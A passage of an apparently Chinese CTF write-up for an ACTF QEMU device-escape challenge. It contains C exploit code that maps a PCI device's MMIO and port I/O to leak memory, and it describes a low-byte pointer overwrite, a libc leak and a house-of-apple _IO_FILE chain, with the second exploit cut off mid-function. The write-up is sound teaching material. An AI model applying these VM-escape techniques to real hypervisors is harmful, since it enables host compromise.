class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint64_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br><span class="hljs-comment">// 00:0000│ rbx 0x56043c8e1fa8 ◂— 0xaba29ec2a98dd89a                                                     </span><br><span class="hljs-comment">// 01:0008│     0x56043c8e1fb0 ◂— 0xbbf1b4ab81b4a9d4                                                     </span><br><span class="hljs-comment">// 02:0010│     0x56043c8e1fb8 ◂— 0xfb92a48db386ffa8                                                     </span><br><span class="hljs-comment">// 03:0018│     0x56043c8e1fc0 ◂— 0xefb491b8afb4abd3                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x56043c8e1fc8 ◂— 0x80ef69f1cbd00397                                                    </span><br><span class="hljs-comment">// 05:0028│     0x56043c8e1fd0 ◂— 0xb2eb07859cda52d3                                                     </span><br><span class="hljs-comment">// 06:0030│     0x56043c8e1fd8 ◂— 0xec9e22f5a5a07fa3                                                 </span><br><span class="hljs-comment">// 07:0038│     0x56043c8e1fe0 ◂— 0x4b36df7b5b655a84 </span><br><br><span class="hljs-comment">// 00:0000│ rbx 0x559cbeef0fa8 ◂— 0x7a1299023d29ff68                                                     </span><br><span class="hljs-comment">// 01:0008│     0x559cbeef0fb0 ◂— 0x702edf5e423bb634                                                     </span><br><span class="hljs-comment">// 02:0010│     0x559cbeef0fb8 ◂— 0x2653e2366369b36c                                                     </span><br><span class="hljs-comment">// 03:0018│     0x559cbeef0fc0 ◂— 0xd9a33790b594ae73                                                     </span><br><span class="hljs-comment">// 04:0020│ r11 0x559cbeef0fc8 ◂— 0xc9b59388b0adbfbe                                                     </span><br><span class="hljs-comment">// 05:0028│     0x559cbeef0fd0 ◂— 0x8bb287b5efbeaf84                                                     </span><br><span class="hljs-comment">// 06:0030│     0x559cbeef0fd8 ◂— 0x95b4a2838496a4f8                                                    </span><br><span class="hljs-comment">// 07:0038│     0x559cbeef0fe0 ◂— 0xc6ca9ad88681c5b4     </span><br><br><span class="hljs-comment">// 0x7f0f875f94a0 ◂— 0x3525b76e0d25b76e</span><br><span class="hljs-comment">// 0x7f0f875f94a8 ◂— 0xb5a5278efde5674e</span><br><span class="hljs-comment">// 0x7f0f875f94b0 ◂— 0xb58517cead8517ce</span><br><span class="hljs-comment">// 0x7f0f875f94b8 ◂— 0x3505e72e7d4527ee</span><br><br><span class="hljs-comment">// something_i_know ^ x = flag 0x559cbeef0570</span><br><br>    set_value(<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7a1299023d29ff68</span>);<br>    set_value(<span class="hljs-number">0x8</span>,<span class="hljs-number">0x702edf5e423bb634</span>);<br>    set_value(<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2653e2366369b36c</span>);<br>    set_value(<span class="hljs-number">0x18</span>,<span class="hljs-number">0xd9a33790b594ae73</span>);<br>    set_value(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xc9b59388b0adbfbe</span>);<br>    set_value(<span class="hljs-number">0x28</span>,<span class="hljs-number">0x8bb287b5efbeaf84</span>);<br>    set_value(<span class="hljs-number">0x30</span>,<span class="hljs-number">0x95b4a2838496a4f8</span>);<br>    set_value(<span class="hljs-number">0x38</span>,<span class="hljs-number">0xc6ca9ad88681c5b4</span>);<br>    <br>    pmio_write(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>后来👴看了arr的wp，知道了这边才是核心(👴是不会说👴刚开始把后面的赋值当成核心在看的（bushi））</p><p><img src="/img/ACTF/9.png" alt="img"></p><p>👴动调了一会发现大概应该或许可能是一个有点麻烦的异或，反正👴出flag了不管了</p><h3 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h3><p>👴一直搞不明白那个0xa31的地方是怎么变成1的</p><p>看了xtx师傅的wp发现pmio_write两次就行了，啊？</p><p>逆不明白，尊嘟逆不明白</p><p>后面就是mmio_write可以覆写0xa78低4位，造成任意地址读写</p><p>然后libc泄露因为只有低4位可改，找了半天也找不到，看了Esifiel师傅的官方wp才知道原来pandbg还有这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">pwndbg&gt; leakfind <span class="hljs-number">0x7fff60000000</span> --max_offset=<span class="hljs-number">0x1000</span> --page_name=libc<br>        <span class="hljs-number">0x7fff60000000</span>+<span class="hljs-number">0x8a0</span> —▸ <span class="hljs-number">0x7ffff0000030</span>+<span class="hljs-number">0x870</span> —▸ <span class="hljs-number">0x7ffff6819c80</span> /usr/lib/x86_64-linux-gnu/libc.so<span class="hljs-number">.6</span><br></code></pre></td></tr></table></figure><p>啊？啊？啊？</p><p>🤡</p><p>后面就是打_IO_FILE，在关机的时候把flag带出来，我这里用的是最顺手的house of apple链子</p><p>然后因为只有低四字节能覆盖，泄露libc大概有1&#x2F;2的概率offset超出四字节限制，回直接dump掉，调式的时候真给👴干🤮🌶️。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-comment">// #define PAGE_SHIFT 12</span><br><span class="hljs-comment">// #define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT) // 4096</span><br><span class="hljs-comment">// #define PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-comment">// #define PFN_PFN ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-comment">// #define PMIO_BASE 0x000000000000c000</span><br><span class="hljs-comment">// #define CSR(_x) ((_x) &lt;&lt; 3)</span><br><span class="hljs-comment">// #define CSR5_TS_SUSPENDED 6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PMIO_BASE 0XC040</span><br><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* mmio_mem;<br><span class="hljs-type">uint8_t</span> payload[<span class="hljs-number">0x100</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_binary</span><span class="hljs-params">(<span class="hljs-type">char</span>* buf, <span class="hljs-type">int</span> length)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Address info starting in %p:\n&quot;</span>, buf);<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> output_buffer[<span class="hljs-number">80</span>];<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">80</span>);<br>    <span class="hljs-built_in">memset</span>(output_buffer, <span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;(length % <span class="hljs-number">16</span> == <span class="hljs-number">0</span> ? length / <span class="hljs-number">16</span> : length / <span class="hljs-number">16</span> + <span class="hljs-number">1</span>); i++)&#123;<br>        <span class="hljs-type">char</span> temp_buffer[<span class="hljs-number">0x10</span>];<br>        <span class="hljs-built_in">memset</span>(temp_buffer, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">0x10</span>);<br>        <span class="hljs-built_in">sprintf</span>(temp_buffer, <span class="hljs-string">&quot;%#5x&quot;</span>, index);<br>        <span class="hljs-built_in">strcpy</span>(output_buffer, temp_buffer);<br>        output_buffer[<span class="hljs-number">5</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">6</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">7</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">16</span>; j++)&#123;<br>            <span class="hljs-keyword">if</span>(index+j &gt;= length)<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;   &quot;</span>);<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-built_in">sprintf</span>(output_buffer+<span class="hljs-number">8</span>+<span class="hljs-number">3</span>*j, <span class="hljs-string">&quot;%02x &quot;</span>, ((<span class="hljs-type">int</span>)buf[index+j]) &amp; <span class="hljs-number">0xFF</span>);<br>                <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">isprint</span>(buf[index+j]))<br>                    output_buffer[<span class="hljs-number">58</span>+j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>                <span class="hljs-keyword">else</span><br>                    output_buffer[<span class="hljs-number">58</span>+j] = buf[index+j];<br>            &#125;<br>        &#125;<br>        output_buffer[<span class="hljs-number">55</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        output_buffer[<span class="hljs-number">56</span>] = <span class="hljs-string">&#x27;|&#x27;</span>;<br>        output_buffer[<span class="hljs-number">57</span>] = <span class="hljs-string">&#x27; &#x27;</span>;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, output_buffer);<br>        <span class="hljs-built_in">memset</span>(output_buffer+<span class="hljs-number">58</span>, <span class="hljs-string">&#x27;\0&#x27;</span>, <span class="hljs-number">16</span>);<br>        index += <span class="hljs-number">16</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;---------------------------------------------------------------------------\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> *((<span class="hljs-type">uint32_t</span> *)(mmio_mem + addr));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    *((<span class="hljs-type">uint32_t</span>*)(mmio_mem + addr)) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">pmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> inl(PMIO_BASE + value);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span><br>&#123;<br>    outb(value,PMIO_BASE+addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_value</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr, <span class="hljs-type">uint64_t</span> value)</span><br>&#123;<br>    mmio_write(addr,value&amp;<span class="hljs-number">0xffffffff</span>);<br>    mmio_write(addr+<span class="hljs-number">4</span>,value&gt;&gt;<span class="hljs-number">32</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">send_payload</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> start_addr, <span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size / <span class="hljs-number">8</span>; ++i)&#123;<br>        mmio_write(<span class="hljs-number">0x40</span>, start_addr);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; ++j)&#123;<br>            pmio_write(j + <span class="hljs-number">0x10</span>, payload[i * <span class="hljs-number">8</span> + j]);<br>        &#125;<br>        start_addr += <span class="hljs-number">8</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> leak[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>,O_SYNC|O_RDWR);<br>    <span class="hljs-keyword">if</span> (mmio_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open mmio device failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    mmio_mem = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (mmio_mem == MAP_FAILED)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;get mmio_mem failed!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr of mmio:%p\n&quot;</span>,mmio_mem);<br><br>    <span class="hljs-keyword">if</span> (iopl(<span class="hljs-number">3</span>)!=<span class="hljs-number">0</span>)<br>    &#123;<br>        perror(<span class="hljs-string">&quot;open pmio device failed!&quot;</span>);<br>        <span 